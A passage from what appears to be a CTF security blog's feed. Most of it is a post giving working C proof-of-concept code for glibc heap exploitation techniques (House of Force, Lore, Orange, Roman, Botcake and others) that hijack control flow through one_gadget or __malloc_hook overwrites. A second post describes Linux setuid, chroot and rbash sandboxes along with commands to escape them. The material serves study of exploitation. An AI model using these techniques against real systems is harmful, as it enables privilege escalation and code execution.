corresponding to mem */    INTERNAL_SIZE_T size;        /* its size */    mfastbinptr*    fb;          /* associated fastbin */    ...    p = mem2chunk(mem);    size = chunksize(p);    if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)        || __builtin_expect ((uintptr_t) p &amp; MALLOC_ALIGN_MASK, 0))    {        errstr = &quot;free(): invalid pointer&quot;;      errout:        malloc_printerr (check_action, errstr, mem);        return;    }</code></pre><h2 id="House-of-Mind-glibc-2-3-5"><a href="#House-of-Mind-glibc-2-3-5" class="headerlink" title="House of Mind (glibc-2.3.5)"></a>House of Mind (glibc-2.3.5)</h2><p>TODO</p><p>(<a href="https://gbmaster.wordpress.com/2015/06/15/x86-exploitation-101-house-of-mind-undead-and-loving-it/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF MIND” – UNDEAD AND LOVING IT…</a>)</p><pre><code class="cpp">public_fREe(Void_t* mem){  mstate ar_ptr;  mchunkptr p;                          /* chunk corresponding to mem */  void (*hook) (__malloc_ptr_t, __const __malloc_ptr_t) = __free_hook;  if (hook != NULL) {    (*hook)(mem, RETURN_ADDRESS (0));    return;  }  if (mem == 0)                              /* free(0) has no effect */    return;  p = mem2chunk(mem);#if HAVE_MMAP  if (chunk_is_mmapped(p))                       /* release mmapped memory. */  {    munmap_chunk(p);    return;  }#endif  ar_ptr = arena_for_chunk(p);#if THREAD_STATS  if(!mutex_trylock(&amp;ar_ptr-&gt;mutex))    ++(ar_ptr-&gt;stat_lock_direct);  else {    (void)mutex_lock(&amp;ar_ptr-&gt;mutex);    ++(ar_ptr-&gt;stat_lock_wait);  }#else  (void)mutex_lock(&amp;ar_ptr-&gt;mutex);#endif  _int_free(ar_ptr, mem);  (void)mutex_unlock(&amp;ar_ptr-&gt;mutex);}</code></pre><h2 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h2><p>Modify top chunk to control buffer.</p><p>(<a href="https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF FORCE” – JEDI OVERFLOW</a>)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#define offset1 0x601080 - 0x10 - 0x602020 - 0x10#define offset2 0x7fffffffdf10 - 0x10 - 0x6014f0 - 0x10char buf1[50] = &quot;Original Buffer (bss).&quot;;int main() {    void *p, *q;    char buf2[50] = &quot;Original Buffer (stack).&quot;;    p = malloc(0x18);    *(uint64_t *)((uint64_t)p + 0x18) = -1; // Set top chunk&#39;s size = 0xffffffffffffffff    malloc(offset1);    q = malloc(0x48);    puts(buf1);    memset(q, &#39;X&#39;, strlen(buf1));    puts(buf1);    /*    p = malloc(0x18);    *(uint64_t *)((uint64_t)p + 0x18) = -1; // Set top chunk&#39;s size = 0xffffffffffffffff    malloc(offset2);    q = malloc(0x48);    puts(buf2);    memset(q, &#39;Y&#39;, strlen(buf2));    puts(buf2);    */    exit(0);}</code></pre><h2 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h2><p>Use the mechanism of smallbin to control buffer. (maybe Smallbin Attack)</p><p>(<a href="https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF LORE” – PEOPLE AND TRADITIONS</a>)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;void sh() {    system(&quot;/bin/sh&quot;);    exit(0);}int main() {    void *p, *q, *r, *s, *t;    char buf1[0x20], buf2[0x20];    fprintf(stderr, &quot;buf1 =&gt; %p\n&quot;, buf1);    fprintf(stderr, &quot;buf2 =&gt; %p\n&quot;, buf2);    p = malloc(0x68);    fprintf(stderr, &quot;p = malloc(0x68) =&gt; %p\n&quot;, p);    *(uint64_t *)((uint64_t)buf1 + 0x10) = (uint64_t)p - 0x10; // Set buf1&#39;s fd = p - 0x10    *(uint64_t *)((uint64_t)buf1 + 0x18) = (uint64_t)buf2; // Set buf1&#39;s bk = buf2    *(uint64_t *)((uint64_t)buf2 + 0x10) = (uint64_t)buf1; // Set buf2&#39;s fd = buf1    q = malloc(0x408);    fprintf(stderr, &quot;q = malloc(0x408) =&gt; %p\n&quot;, q);    free(p);    r = malloc(0x508);    fprintf(stderr, &quot;r = malloc(0x508) =&gt; %p\n&quot;, r); // Trigger malloc_consolidate    *(uint64_t *)((uint64_t)p + 0x8) = (uint64_t)buf1; // Set p&#39;s bk = buf1    s = malloc(0x68);    fprintf(stderr, &quot;s = malloc(0x68) =&gt; %p\n&quot;, s); // Get p (The original Freed Chunk)    t = malloc(0x68);    fprintf(stderr, &quot;t = malloc(0x68) =&gt; %p\n&quot;, t); // Allacte to Stack    uint64_t sh_addr = (uint64_t)sh;    memcpy(t + 0x48, &amp;sh_addr, 8);}</code></pre><h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>Free a fake chunk into fastbin. (Stack overflow)</p><p>(<a href="https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF SPIRIT” – FRIENDLY STACK OVERFLOW</a>)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;char target[0x100];int main() {    void *p, *mem;    fprintf(stderr, &quot;Target =&gt; %p\n&quot;, target);    p = malloc(0x58);    mem = (uint64_t *)((uint64_t)target + 0x10); // Get fake chunk&#39;s mem    fprintf(stderr, &quot;fake chunk&#39;s mem =&gt; %p\n&quot;, mem);    *(uint64_t *)((uint64_t)target + 0x8) = 0x61; // Set fake chunk&#39;s size = 0x61    *(uint64_t *)((uint64_t)target + 0x68) = 0x41; // Set fake chunk&#39;s next chunk&#39;s size = 0x41    free(p);    free(mem);    fprintf(stderr, &quot;malloc(0x58) =&gt; %p\n&quot;, malloc(0x58));    exit(0);}</code></pre><h2 id="House-of-Chaos"><a href="#House-of-Chaos" class="headerlink" title="House of Chaos"></a>House of Chaos</h2><pre><code>(&amp;*^^&amp;%$#%$#**_)+_(_)**(%%^##$@%^^*(%$&amp;*%^$&amp;%%^^&amp;#!@^&amp;_)^&amp;...</code></pre><h1 id="Later-House"><a href="#Later-House" class="headerlink" title="Later House"></a>Later House</h1><h2 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a><a href="https://www.youtube.com/watch?v=tq3mPjsl-H0" target="_blank" rel="noopener">House of Einherjar</a></h2><p>Mostly chunk overlapping. (Unlink, Off by One)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;unistd.h&gt;int main() {    char *p, *q, *r, *s;    p = malloc(0x208);    q = malloc(0x18);    r = malloc(0xf8);    s = malloc(0x18);    printf(&quot;Fake chunk =&gt; %p\n&quot;, p);    *(uint64_t *)((uint64_t)p) = 0;    *(uint64_t *)((uint64_t)p + 0x8) = 0x221; // Fake chunk&#39;s size    // Bypass unlink    *(uint64_t *)((uint64_t)p + 0x10) = p; // Fake chunk&#39;s fd    *(uint64_t *)((uint64_t)p + 0x18) = p; // Fake chunk&#39;s bk    printf(&quot;Off by One\n&quot;);    *(uint64_t *)((uint64_t)q + 0x10) = 0x220; // prev_size    *(uint8_t *)((uint64_t)q + 0x18) = &#39;\x00&#39;; // Off by One    free(r); // unlink    printf(&quot;malloc(0x310) =&gt; %p\n&quot;, malloc(0x318));    return 0;}</code></pre><h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a><a href="http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" target="_blank" rel="noopener">House of Orange</a></h2><p>Create a freed chunk without <code>free()</code> and attack with <code>_IO_FILE</code> structure. (Unsortedbin Attack)</p><pre><code class="cpp">// glibc-2.23 version#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#define _IO_list_all 0x3c5520#define one_gadget 0xf1147char fake_vtable[0xa8];int main() {    void *p;    void *fake_file;    p = malloc(0x18);    *(uint64_t *)((uint64_t)p + 0x18) = 0xfe1; // Set top chunk&#39;s size = 0xfe1    malloc(0x1000); // Trigger sysmalloc (free top chunk)    p = malloc(0x500); // Get a unsortedbin-chunk    uint64_t libc_base = (uint64_t)(*(uint64_t *)p) - 0x3c5188;    fprintf(stderr, &quot;leak libc =&gt; %p\n&quot;, libc_base);    uint64_t unsorted_bin_chunk_addr = (uint64_t)p + 0x500;    fake_file = unsorted_bin_chunk_addr;    uint64_t IO_list_all_addr = libc_base + _IO_list_all;    // Create fake file (also a fake smallbin)    *(uint64_t *)((uint64_t)fake_file + 0x8) = 0x61; // _IO_read_ptr ; Set smallbin&#39;s size ; Fake _chain @ `&amp;unsortedbin + 0x68`    *(uint64_t *)((uint64_t)fake_file + 0x18) = IO_list_all_addr - 0x10; // _IO_read_base ; For Unsoredbin Attack    // Bypass _IO_overflow_t    *(uint64_t *)((uint64_t)fake_file + 0xc0) = 0; // _mode    *(uint64_t *)((uint64_t)fake_file + 0x28) = 1; // _IO_write_ptr    *(uint64_t *)((uint64_t)fake_file + 0x20) = 0; // _IO_write_base    *(uint64_t *)((uint64_t)fake_file + 0xd8) = fake_vtable; // vtable    uint64_t one_gadget_addr = libc_base + one_gadget;    *(uint64_t *)((uint64_t)fake_vtable + 0x18) = one_gadget_addr; // __overflow    malloc(1); // Trigger malloc_printerr    exit(0);}</code></pre><h2 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a><a href="https://github.com/shift-crops/House_of_Rabbit" target="_blank" rel="noopener">House of Rabbit</a></h2><p>TODO</p><p>(recommend <a href="http://p4nda.top/2018/04/18/house-of-rabbit/" target="_blank" rel="noopener">P4nda’s article</a>)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char target[0x50] = &quot;Orignial Buffer.&quot;;char buf[0x40];int main() {    void *p, *q;    fprintf(stderr, &quot;Target: %s\n&quot;, target);    p = malloc(0xa00008);    free(p);    p = malloc(0xa00008);    free(p);    p = malloc(0x28);    q = malloc(0x88);    free(p);    *(uint64_t *)((uint64_t)buf + 0x8) = 0x11; // Set Fake Chunk1&#39;s size = 0x11    *(uint64_t *)((uint64_t)buf + 0x18) = -0xf; // Set Fake Chunk2&#39;s prev_size = 0xfffffffffffffff1    *(uint64_t *)((uint64_t)p) = (uint64_t *)((uint64_t)buf + 0x10); // Set Fastbin Chunk&#39;s fd = Fake Chunk2    free(q); // Trigger malloc_consolidate    *(uint64_t *)((uint64_t)buf + 0x18) = 0xa00001; // Set Fake Chunk    malloc(0xa00000);    *(uint64_t *)((uint64_t)buf + 0x18) = -0xf; // Set Fake Chunk    int offset = (uint64_t)&amp;target - ((uint64_t)buf + 0x10) - 0x20;    p = malloc(offset);    fprintf(stderr, &quot;p = malloc(offset) =&gt; %p\n&quot;, p);    void *victim = malloc(0x18);    strcpy(victim, &quot;Hacked.&quot;);    fprintf(stderr, &quot;Target: %s\n&quot;, target);    exit(0);}</code></pre><h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a><a href="https://github.com/romanking98/House-Of-Roman" target="_blank" rel="noopener">House of Roman</a></h2><p>Partial write to control PC. (Off by One, Fastbin Attack, Unsortedbin Attack, etc)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#define libc_base 0x7ffff7a0d000#define __malloc_hook libc_base+0x3c4b10#define one_gadget libc_base+0xf02a4int main() {    void *p, *q, *r, *s, *u, *v;    p = malloc(0x18);    q = malloc(0xc8);    r = malloc(0x68);    *(uint64_t *)((uint64_t)q + 0x68) = 0x61;    free(q);    q = malloc(0xc8); // Get Unsortedbin addr    s = malloc(0x68);    u = malloc(0x68); // For fixing Fastbin    v = malloc(0x68); // For triggering malloc_printerr    *(uint8_t *)((uint64_t)p + 0x18) = 0x71; // Off by One    free(r);    free(s);    *(uint8_t *)((uint64_t)s) = 0x20; // Point s&#39;s fd to q    *(uint16_t *)((uint64_t)q) = (__malloc_hook - 0x23) &amp; 0xffff; // Point q&#39;s fd to `&amp;__malloc_hook - 0x23`    fprintf(stderr, &quot;malloc(0x68) =&gt; %p\n&quot;, malloc(0x68));    fprintf(stderr, &quot;malloc(0x68) =&gt; %p\n&quot;, malloc(0x68));    p = malloc(0x68); // Get the chunk @ `&amp;__malloc_hook - 0x23`    free(u);    *(uint64_t *)((uint64_t)u) = 0; // Set Fastbin&#39;s fd = 0 to fix Fastbin    q = malloc(0xc8);    fprintf(stderr, &quot;malloc(0x18) =&gt; %p\n&quot;, malloc(0x18));    free(q);    // Unsortedbin Attack    *(uint16_t *)((uint64_t)q + 0x8) = (__malloc_hook - 0x10) &amp; 0xffff; // Point q&#39;s bk to `&amp;__malloc_hook - 0x10`    fprintf(stderr, &quot;malloc(0xc8) =&gt; %p\n&quot;, malloc(0xc8));    // Partial Write one_gadget    *(uint16_t *)((uint64_t)p + 0x13) = one_gadget &amp; 0xffff;    *(uint8_t *)((uint64_t)p+ 0x15) = (one_gadget &gt;&gt; 16) &amp; 0xff;    free(v);    free(v); // Trigger malloc_printerr    exit(0);}</code></pre><h2 id="House-of-Botcake-gt-glibc-2-26"><a href="#House-of-Botcake-gt-glibc-2-26" class="headerlink" title="House of Botcake (&gt;= glibc-2.26)"></a><a href="https://raw.githubusercontent.com/shellphish/how2heap/master/glibc_2.26/house_of_botcake.c" target="_blank" rel="noopener">House of Botcake</a> (&gt;= glibc-2.26)</h2><p>Bypass double free restriction on tcache. (Double Free, Chunk Overlapping)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;void *ptr[7];char buf[0x20];int main() {    void *p;    fprintf(stderr, &quot;target =&gt; %p\n&quot;, buf);    for (int i = 0; i &lt; 7; i++) { // Fillup Tcache        ptr[i] = malloc(0x108);    }    p = malloc(0x108);    void *victim = malloc(0x108);    malloc(0x18); // padding    for (int i = 0; i &lt; 7; i++) {        free(ptr[i]);    }    free(victim); // Add to unsortedbin    free(p); // Consolidate with victim    malloc(0x108); // get a chunk from Tcache &amp; put victim into Tcache    free(victim); // Double free    p = malloc(0x128);    *(uint64_t *)((uint64_t)p + 0x110) = buf; // Overwrite victim&#39;s fd = buf    malloc(0x108);    p = malloc(0x108);    fprintf(stderr, &quot;p = malloc(0x108) =&gt; %p\n&quot;, p);    exit(0);}</code></pre><h2 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House of Corrosion"></a><a href="https://github.com/CptGibbon/House-of-Corrosion" target="_blank" rel="noopener">House of Corrosion</a></h2><p>TODO</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=dooN6X28daI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=dooN6X28daI</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/</a><br><a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">https://github.com/shellphish/how2heap</a><br><a href="https://darkwing.moe/2019/07/18/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B023-heap%E4%B8%8Emalloc-1/" target="_blank" rel="noopener">https://darkwing.moe/2019/07/18/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B023-heap%E4%B8%8Emalloc-1/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;House-of-*&lt;/code&gt; 是对堆漏洞利用的一系列技术，起源于一篇叫做 Malleus Maleficarum（也有一本中世纪的时候有关女巫的条约的书叫做&lt;a href=&quot;https://en.wikipedia.org/wiki/Malleus_Maleficarum&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;女巫之槌&lt;/a&gt;）的文章。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux Sandbox - Setuid</title>
    <link href="blog.b3ale.cn/2020/04/23/Linux-Sandbox-Setuid/"/>
    <id>blog.b3ale.cn/2020/04/23/Linux-Sandbox-Setuid/</id>
    <published>2020-04-23T14:39:04.000Z</published>
    <updated>2020-04-24T11:47:37.960Z</updated>
    
    <content type="html"><![CDATA[<p>Yet Another Linux Sandbox Technic.</p><a id="more"></a><h1 id="Combination-Blow"><a href="#Combination-Blow" class="headerlink" title="Combination Blow"></a>Combination Blow</h1><p>Setuid Sandbox 主要是基于 Linux Kernel 所提供的安全机制（如 DAC）来实现。简单地说就是利用 <code>random uid/gid + chroot() + capability</code> 的组合出击来达到目标。其实现非常简单，无需修改 Kernel。Setuid Sandbox 的实现简单易行。在一定程度上，它可以用于隔离不可信的程序。由于它完全依赖于 kernel 所提供的安全机制，除非攻击者能找到 kernel 的 0-day 漏洞并通过攻击获得 root 权限，否则 Setuid Sandbox 所提供的安全隔离是可以保证的。</p><h2 id="What-is-setuid"><a href="#What-is-setuid" class="headerlink" title="What is setuid"></a>What is setuid</h2><p>Linux 中每个进程都会有一个 uid，<code>uid = 0</code> 则为 root 用户进程（privileged），<code>uid &gt; 0</code>则为普通用户进程（unprivileged）。不同 uid 进程之间（不包括 root 进程）是相互隔离的，各自都有自己独立的权限，互不干扰。而 root 进程具有特权，它能干任何事情。Linux uid/gid 机制主要是用于进程的权限隔离。如果你打算执行不可信的程序，那么你可以在启动该程序时为其分配一个 random uid，大概的执行流程如下：<code>fork() -&gt; setuid() -&gt; {设置相关的进程资源限制，如 RLIMIT_NPROC (0,0)} -&gt; execve()</code>。而 <code>setuid()</code> 只能由 root 权限（或拥有 <code>CAP_SETUID</code> Capability）才能成功调用，所以要顺利执行这个流程需要借助某个拥有 root 权限的进程。</p><p>Linux 下为进程设置了三个 UID：</p><ul><li>Real UID（RUID）：进程创建者的 UID，正常情况下它一直不会变化，永远表示进程创建者，但 root 用户可以更改它；</li><li>Saved UID（SUID）：拥有者可以为自己的可执行程序设置 SUID 位，设置后任何人执行程序，程序启动时都将获得程序拥有者的权限；</li><li>Effective UID（EUID）：为权限检查时实际生效的 UID，意味着在判断用户权限时并不检查 RUID 及 SUID，只看 EUID。</li></ul><p>用 <code>getresuid</code> 来获取当前用户的三个 UID：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() {    int ruid, euid, suid;    if (getresuid(&amp;ruid, &amp;euid, &amp;suid) == 0) {        printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    } else {        ;    }    return 0;}</code></pre><p>如果为文件加上 SUID 标志位，其他用户运行该文件时会获得 root 的权限。但 RUID 保持不变：</p><pre><code class="bash">root in ~/Setuid-Sandbox λ sudo -u root ./test-uidRUID: 0    EUID: 0    SUID: 0root in ~/Setuid-Sandbox λ sudo -u www-data ./test-uidRUID: 33    EUID: 33    SUID: 33root in ~/Setuid-Sandbox λ chmod u+s ./test-uidroot in ~/Setuid-Sandbox λ ls -l ./test-uid-rwsr-xr-x 1 root root 8720 Apr 24 19:11 ./test-uidroot in ~/Setuid-Sandbox λ sudo -u www-data ./test-uidRUID: 33    EUID: 0    SUID: 0</code></pre><h2 id="What-is-chroot"><a href="#What-is-chroot" class="headerlink" title="What is chroot"></a>What is chroot</h2><p>通常来说，提到 Chroot 一般有两个含义，<code>chroot(1)</code> 是 <code>/usr/bin/chroot</code>，<code>chroot(2)</code> 是 glibc 中的一个函数。Chroot 是 Linux Kernel 提供的另一个安全功能，它用于改变进程的根目录。比如运行 <code>chroot(&quot;/tmp/sandbox/1/&quot;)</code>，会启动一个新的 Shell 并设置新进程的根目录为 <code>&quot;/tmp/sandbox/1/&quot;</code>，那么该进程的文件操作将被限制在 <code>&quot;/tmp/sandbox/1/&quot;</code> 中。注意，<code>chroot()</code> 只能由 root 权限（或拥有 <code>CAP_SYS_CHROOT</code> Capability）才能成功调用。</p><h3 id="Chroot-Command"><a href="#Chroot-Command" class="headerlink" title="Chroot Command"></a>Chroot Command</h3><p>需要静态编译 Busybox 和 Bash：</p><pre><code class="bash">$ wget$ tar -zxvf$ cd  &amp;&amp; mkdir build$ make O=build defconfig$ cd build &amp;&amp; make menuconfig # Select &quot;Build BusyBox as a static binary (no shared libs)&quot;$ make$ wget http://ftp.gnu.org/gnu/bash/bash-5.0-beta.tar.gz$ tar -zxvf bash-5.0-beta.tar.gz$ cd bash-5.0-beta &amp;&amp; ./configure --enable-static-link --without-bash-malloc$ make</code></pre><p>使用 chroot 来修改当前的根目录，可以看到 ls 的结果是不同的：</p><pre><code class="bash">root in ~/Setuid-Sandbox λ ./bashroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# ./busybox ls /bin             etc             initrd.img.old  lost+found      opt             run             sys             varboot            home            lib             media           proc            sbin            tmp             vmlinuzdev             initrd.img      lib64           mnt             root            srv             usr             vmlinuz.oldroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# exitexitroot in ~/Setuid-Sandbox λ chroot . ./bashbash-5.0# ./busybox ls /bash      busybox   chroot    chroot.c  lsbash-5.0# exitexit</code></pre><h3 id="Chroot-Function"><a href="#Chroot-Function" class="headerlink" title="Chroot Function"></a>Chroot Function</h3><p>进程中有 <code>cwd</code>（当前目录）和 <code>root</code>（根目录）两个目录。C 库中提供了几个函数对两者进行修改：</p><pre><code class="cpp">int chdir(const char *path);     //依据目录名改cwdint fchdir(int fd);              //依据文件描述符改cwdint chroot(const char *path);    //依据目录名改root</code></pre><pre><code class="cpp">#include &lt;unistd.h&gt;int main() {    chroot(&quot;.&quot;);    chdir(&quot;/&quot;);    char *argv[] = {&quot;./bash&quot;, NULL};    execl(argv[0], argv, NULL);    return 0;}</code></pre><h3 id="Create-bash-jail"><a href="#Create-bash-jail" class="headerlink" title="Create bash jail"></a>Create bash jail</h3><p>可以使用 <a href="https://olivier.sessink.nl/jailkit/index.html" target="_blank" rel="noopener">jailkit</a> 创建一个安全的 jail 环境：</p><pre><code class="bash">$ wget https://olivier.sessink.nl/jailkit/jailkit-2.20.tar.gz$ tar -zxvf jailkit-2.20.tar.gz$ cd jailkit-2.20 &amp;&amp; ./configure$ make$ make install</code></pre><h3 id="Combine-with-setuid"><a href="#Combine-with-setuid" class="headerlink" title="Combine with setuid"></a>Combine with setuid</h3><p>那么在前面叙述的执行流程中，可以先让具有 root 权限的进程去执行 <code>chroot()</code> 后再调用 <code>setuid() -&gt; {...} -&gt; execve()</code>。但其实这样做是行不通的，因为进程的根目录已经被修改，<code>execve()</code> 本要执行的 Binary 文件已经不可用了。Google 的一篇文章里给出了一个解决此问题的简单方法：</p><ol><li>创建一个子进程，注意使用 <code>clone()</code> 和 <code>CLONE_FS</code>，使得父子进程可以共享根目录、当前目录等等；</li><li>父进程降权后执行 <code>execve()</code>，又产生一个新进程；</li><li>然后父进程请求子进程执行 <code>chroot()</code>；</li><li>子进程执行 <code>chroot()</code>，新的根目录会对两个子进程同时生效。</li><li>父进程退出。</li></ol><p>这个方法的前提是 父进程 需要设置 <code>RLIMIT_NOFILE</code> 为 <code>(0, 0)</code>，并且对于不可信的子进程（<code>execve</code> 创建的新进程）来说，在执行第 4 步之前应是可控的。另外，对于父进程来说，由于它是以 root 身份运行，那么就可能会成为攻击点，比如 Confused Deputy Problem。</p><h2 id="Capability-Mechanism"><a href="#Capability-Mechanism" class="headerlink" title="Capability Mechanism"></a>Capability Mechanism</h2><p>Linux Capability 主要是解决 Confused Deputy Problem（如 CSRF）。Linux 支持 Capability 的主要目的是细化 root 的特权。比如拿 ping 来说，它需要使用 raw_sockets 所以需要 root 特权才能运行；如果有了 Capability 机制，由于该程序只需要一个 <code>CAP_NET_RAW</code> 的 Capability 即可运行，那么根据最小权限原则，该程序运行时可以丢弃所有多余的 Capability，以防止被误用或被攻击。所以，Capability 机制可以将 root 特权进行很好的细分。Kernel-2.6.18 起已支持 30 多种不同的 Capability，在 Kernel-2.6.24 及以上的版本中一个普通用户进程也将可以持有 Capability。</p><h2 id="What-is-rbash（Restricted-Bash）"><a href="#What-is-rbash（Restricted-Bash）" class="headerlink" title="What is rbash（Restricted Bash）"></a>What is rbash（Restricted Bash）</h2><p><code>rbash</code> 的主要作用是限制了部分 Bash 命令，会以一种受限的方式启动 Bash：</p><ol><li>只能执行当前目录下的可执行文件；</li><li>在执行命令时命令不能带 <code>/</code>；</li><li>不能改变当前工作目录；</li><li>不能更改 <code>PATH</code> 或 <code>SHELL</code> 变量；</li><li>不能使用重定向输出；</li><li>…</li></ol><pre><code class="bash">root@5b0ef65c6894:~# rbashroot@5b0ef65c6894:~# cd tmp/rbash: cd: restrictedroot@5b0ef65c6894:~# ./tmp/rp-lin-x64rbash: ./tmp/rp-lin-x64: restricted: cannot specify `/&#39; in command namesroot@5b0ef65c6894:~# export PATH=$PATH:/root/tmprbash: PATH: readonly variable</code></pre><h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><h2 id="Bypass-setuid"><a href="#Bypass-setuid" class="headerlink" title="Bypass setuid"></a>Bypass setuid</h2><p>当程序执行完高权限后使用 <code>setresuid</code> 进行降权操作，但是并未完全抹除高权限：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() {    int ruid, euid, suid;    getresuid(&amp;ruid, &amp;euid, &amp;suid);    printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    seteuid(2333); // Modify EUID    getresuid(&amp;ruid, &amp;euid, &amp;suid);    printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    setresuid(-1, 2, -1); // unprivileged    getresuid(&amp;ruid, &amp;euid, &amp;suid);    printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    setresuid(-1, 0, -1); // Get root privilege    setresuid(123, 123, 123);    getresuid(&amp;ruid, &amp;euid, &amp;suid);    printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    return 0;}</code></pre><h2 id="Bypass-chroot"><a href="#Bypass-chroot" class="headerlink" title="Bypass chroot"></a>Bypass chroot</h2><p>Chroot 沙箱可以将进程对文件的访问限制在一个指定的目录中，但是由于 Chroot 不是一个安全的 feature，所以该沙箱可能会被逃逸出来。比如使用 <a href="https://github.com/earthquake/chw00t" target="_blank" rel="noopener"><code>chw00t</code></a>。当进程中存在文件在当前 root 目录树外，即在 jail 外，即表明越狱成功，此时的 root 就是原来文件系统的 root 了。</p><h2 id="Bypass-rbash"><a href="#Bypass-rbash" class="headerlink" title="Bypass rbash"></a>Bypass rbash</h2><p>rbash 的绕过方法也有很多，通常跟 chroot 配合使用。不过它本身对文件操作是没有限制的。可以使用 vi、vim 等命令时：</p><pre><code class="bash">root in ~/Setuid-Sandbox λ rbashroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# vi# :set shell=/usr/bin/zsh# :shellroot in ~/Setuid-Sandbox λ lsbash  busybox  chroot  chroot.c  ls</code></pre><p>可以使用 cp、mv 等文件操作命令时：</p><pre><code class="bash">root in ~/Setuid-Sandbox λ rbashroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# cp /usr/bin/zsh .root@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# lsbash  busybox  chroot  chroot.c  ls  zshroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# zshroot in ~/Setuid-Sandbox λ lsbash  busybox  chroot  chroot.c  ls  zsh</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.linuxidc.com/Linux/2015-02/112914.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2015-02/112914.htm</a><br><a href="https://atum.li/2017/04/25/linuxsandbox" target="_blank" rel="noopener">https://atum.li/2017/04/25/linuxsandbox</a><br><a href="https://blog.betamao.me/2019/01/31/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bchroot%E4%B8%8Erbash/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/31/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bchroot%E4%B8%8Erbash/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Yet Another Linux Sandbox Technic.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="linux" scheme="blog.b3ale.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>IO_FILE in CTF</title>
    <link href="blog.b3ale.cn/2020/04/19/IO-FILE-in-CTF/"/>
    <id>blog.b3ale.cn/2020/04/19/IO-FILE-in-CTF/</id>
    <published>2020-04-19T06:44:34.000Z</published>
    <updated>2020-05-21T13:04:31.006Z</updated>
    
